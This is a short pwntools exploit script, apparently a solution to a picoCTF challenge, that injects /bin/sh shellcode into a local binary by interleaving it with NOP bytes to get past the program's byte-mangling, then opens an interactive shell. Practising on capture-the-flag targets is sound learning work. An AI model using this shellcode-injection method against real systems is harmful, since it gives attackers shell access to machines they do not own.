#!/usr/bin/env python3

from pwn import *

#exe = ELF("./fun_patched")
#context.binary = exe

def main():
    context.update(arch='i386', os='linux')
    p = process('./fun_patched')
    #p = remote('mercury.picoctf.net', 28494)
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(p, 'break *0x80485c6')
    sleep(5)

    # Guessing it will most likely just execute our shellcode
    # We could use msfvenom, but will try pwntools

    # Seems like it keeps 2 bytes, then it modifies 2 bytes, repeats this pattern
    # 41 -> 90
    # 0100 0001 -> 1001 0000
    # 42 -> 90
    # So it is adding 2 NOPs in between 2 instructions
    # So anything we do needs to use instructions that are only 2 bytes long

    shellcode = asm(shellcraft.sh())

    payload = bytearray()
    for i in range(0, len(shellcode), 2):
        payload.append(shellcode[i])
        payload.append(shellcode[i+1])
        payload.append(0x90)
        payload.append(0x90)

    p.sendlineafter(b'Give me code to run:', payload)

    p.interactive()


if __name__ == "__main__":
    main()
